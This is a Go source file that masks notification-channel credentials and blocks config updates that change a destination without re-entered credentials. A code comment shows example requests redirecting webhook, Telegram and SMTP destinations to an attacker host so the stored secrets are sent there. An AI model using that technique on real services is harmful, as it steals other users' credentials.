package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of a mask value. When the API echoes credentials it replaces the real content with a value carrying this prefix,
// and when the update endpoint receives a value with this prefix it understands "keep the stored value unchanged".
//
// A prefix is used rather than an empty string or a fixed constant so that a little identifying information can be carried along
// (see MaskedValue), letting users tell "which bot this is" without pasting the key again.
const MaskedPrefix = "__masked__"

// MaskedValue produces a mask value:
//
//	"__masked__"              the original is too short, so no hint is given
//	"__masked__:…ab12cd"      the last 6 characters of the original are included as an identifying hint
//
// Exposing only the last 6 characters is deliberate: a webhook URL's identifying information is at the end (such as WeCom's key or
// Feishu's bot id), while the prefix is the same for every bot and has no identifying value. The last 6 characters are not enough to
// reconstruct the credential, but enough for whoever configured it to recognise "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a mask value (i.e. unchanged since the API echoed it).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the configuration with the channel's credential fields replaced by mask values.
//
// An unknown channel type returns an empty map rather than the original configuration: better for the UI to show "configuration unavailable"
// than to hand back raw content that may contain credentials when the channel type cannot be recognised.
// Non-credential fields are kept as is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures such as headers are treated as a single credential: deciding per sub-key would require every channel
		// to declare yet another set of "which sub-keys are credentials" rules, which costs far more than it is worth.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed, but the caller did not state anything about
// the credential fields". It is returned rather than silently allowing or silently dropping the credentials; see PrepareConfigUpdate for why.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys not explicitly addressed
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "The destination (" + strings.Join(e.Changed, ", ") + ") has changed; please re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + ") as well: enter a new value, or explicitly leave it blank if credentials are no longer needed. " +
		"The original credentials are only valid for the old destination, and reusing them would hand them to the new one."
}

// PrepareConfigUpdate merges a channel configuration and handles the security-sensitive case of "the destination changed".
//
// It replaces the bare MergeConfig on the channel update path and closes this path, which was shown to work in practice:
// the destination (where the message goes) and the credentials (which identity sends it) are two independent sets of fields, and MergeConfig
// always keeps the stored value for "keys not mentioned". So anyone able to PATCH a channel could, by **changing only the address
// and saying nothing about the credentials**, make the server send the real stored credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over the username and password after STARTTLS
//
// This path is completely silent and does not rely on redirects (so refusing cross-host redirects does not stop it),
// and it defeats the very purpose of this package's masking: "credentials are never echoed to the browser".
//
// Rule: as soon as any destination key is changed to a new value, the caller must explicitly address **every** credential key:
//   - a new value given → use the new value
//   - an explicit empty string → the field no longer needs credentials (keeps the clearing semantics)
//   - the mask value sent back unchanged / the key not mentioned at all → rejected
//
// The third case is rejected as well because a "mask value" means precisely "reuse the old credentials", and the old credentials
// are only valid for the old destination. "Automatically drop the credentials" is deliberately not done here: for optional credential fields
// (webhook headers, email password) that would silently turn into "authentication is gone but the API returns 200",
// which is harder to diagnose than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (for example webhook headers, which is an object) has a mask literal embedded in it,
	// the caller has put the "keep the original value" sentinel inside a structure. MergeConfig only recognises "a string
	// with the prefix" as a mask, so this form would be stored as an ordinary object: the literal "__masked__" would really end up
	// in the database, and authentication would then fail silently with no error at all. Better to reject it.
	//
	// This check must come **first**: when the address has not changed there is an early return, so placing it later would
	// only cover the "address changed" path (the first version put it in the wrong place, and the tests caught it immediately).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that really changed. A mask value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address has not changed, so do an ordinary merge (mask values keep the original, empty strings clear, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// The address changed: require every credential key to be explicitly addressed.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions with the mask sentinel embedded in a non-string structure.
//
// The masking mechanism assumes "the whole value is a string". An object field such as webhook headers
// can only be masked as a whole (written as the string "__masked__") or submitted as a whole; putting the sentinel inside the object
// cannot express "keep unchanged" and would be stored in the database as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("the content of field %s contains the mask marker %q: this field can only be left blank as a whole to keep it, or submitted whole with a new value; a mask placeholder cannot be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. JSON serialisation is used for the comparison to handle
// type differences at the same time: the frontend submits a port as a number while the stored value is read back as a float64, so a direct == would misjudge.
//
// "Empty" must be normalised before comparing: an empty string and "key absent" are the same state in this config model,
// because MergeConfig treats an empty string as an explicit clear and deletes the key. Without normalisation, an optional
// destination field that is always left blank (Telegram's base_url is the only such field: blank means the
// official address) would go down this path:
//
//	stored base_url:"" on creation  →  key deleted by MergeConfig on the first save
//	→ on the second save incoming is "" and stored has no key, so it is judged "the address changed"
//	→ the credentials are mask values → 400 "The destination has changed; please re-enter the credential fields"
//
// Every save after that would fail unless the user pasted the Bot Token again, even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "empty".
// The definition must match MergeConfig's clearing check (strings.TrimSpace(s) == ""),
// otherwise there would be a gap where "MergeConfig thinks it should be deleted but sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming over stored, used when updating a channel configuration.
//
// Rules:
//   - keys in incoming whose value is a mask → keep stored's original value (the user did not change this field)
//   - keys in incoming whose value is an empty string → treated as an explicit clear; the key is deleted
//   - other keys → overwritten with incoming's value
//   - keys in stored but not in incoming → kept (partial update semantics)
//
// Whether an empty string counts as "clear" needs to be explicit: the frontend form submits unfilled fields as empty strings,
// and treating that as a valid value would genuinely clear fields that were "left blank to keep the original value".
// An explicit clear is chosen here because when users want to clear a wrongly set field they have no other way to say so
// (dropping the field could distinguish "not provided" from "provided empty", but the UI has no use for that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // mask value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
